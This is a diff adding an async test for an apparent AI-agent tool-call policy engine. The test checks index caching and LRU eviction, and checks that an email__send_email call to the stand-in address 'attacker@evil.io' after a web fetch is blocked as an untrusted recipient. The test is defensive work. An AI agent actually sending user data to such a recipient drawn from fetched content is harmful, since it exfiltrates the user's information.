@@ -246,3 +246,25 @@ async def test_data_flow_edges_recorded() -> None:
         and ev.edges[0]["arg"] == "to"
         and ev.edges[0]["matched_value"] == "attacker@evil.io"
     )
+
+
+async def test_value_index_extends_incrementally_and_evicts() -> None:
+    engine = make_engine()
+    engine.index_cache_size = 1
+    sid = await session(engine, "email alice@company.com")
+    await engine.check_call(call(sid, "calculator__add", a=1, b=2))
+    assert len(engine._indexes[sid]) == 1  # the prompt
+    await call_and_result(engine, sid, "web__fetch", {"url": "https://x.example"}, PAGE)
+    d = await engine.check_call(
+        call(sid, "email__send_email", to="attacker@evil.io", subject="s", body="b")
+    )
+    assert d.action == "block"
+    assert len(engine._indexes[sid]) == 2
+    other = await session(engine, "hi")
+    await engine.check_call(call(other, "calculator__add", a=1, b=2))
+    assert list(engine._indexes) == [other]  # LRU evicted the first session
+    # A rebuilt index still sees everything in the store.
+    d = await engine.check_call(
+        call(sid, "email__send_email", to="attacker@evil.io", subject="s", body="b")
+    )
+    assert d.rule_id == "no-untrusted-recipient"
